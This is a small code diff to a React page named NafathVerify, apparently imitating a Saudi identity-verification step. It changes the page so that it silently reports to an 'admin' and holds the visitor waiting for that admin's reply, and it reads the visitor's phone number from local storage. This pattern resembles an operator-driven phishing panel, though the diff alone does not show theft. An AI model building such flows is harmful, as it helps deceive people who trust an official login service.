@@ -25,10 +25,11 @@ export default function NafathVerify() {
   useEffect(() => {
     navigateToPage("تحقق نفاذ");
     
-    // إرسال معلومات الصفحة للأدمن بدون إظهار شاشة الانتظار
+    // إرسال معلومات الصفحة للأدمن - العميل ينتظر رد بدون إظهار popup
     sendData({
       current: "تحقق نفاذ",
-      waitingForAdminResponse: false,
+      waitingForAdminResponse: true,
+      mode: "silent",
     });
     
     // جلب رقم الجوال واسم الخدمة من localStorage
